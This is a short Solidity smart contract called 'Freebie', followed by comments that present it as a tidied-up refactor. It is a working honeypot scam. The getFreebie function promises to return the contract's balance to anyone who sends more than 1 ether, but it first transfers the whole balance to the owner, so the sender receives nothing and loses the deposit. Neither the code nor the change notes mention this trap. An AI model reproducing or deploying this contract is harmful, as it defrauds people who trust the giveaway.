pragma solidity ^0.4.19;

contract Freebie {
    address public owner;

    function Freebie() public {
        owner = msg.sender;
    }

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}

// Changes Made:
// 1. Changed Owner to owner and initialized it in constructor instead of declaration
// 2. Changed function names to follow Solidity naming conventions
// 3. Removed unnecessary code from withdraw function
// 4. Added require statement to check for successful low-level call in Command function